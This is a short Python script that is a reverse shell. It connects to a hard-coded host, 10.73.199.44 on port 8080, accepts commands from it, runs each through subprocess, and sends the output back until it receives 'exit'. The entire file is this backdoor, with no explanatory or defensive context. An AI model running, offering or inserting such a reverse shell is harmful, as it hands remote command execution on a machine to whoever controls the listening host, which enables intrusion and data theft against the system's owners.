#!/usr/bin/python

import socket
import subprocess

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.73.199.44", 8080))

	while True:
		command = s.recv(1024)
		if 'exit' in command:
			s.close()
			break
		else:
			CMD = subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send(CMD.stdout.read())
			s.send(CMD.stderr.read())

def main():
	connect()
main()

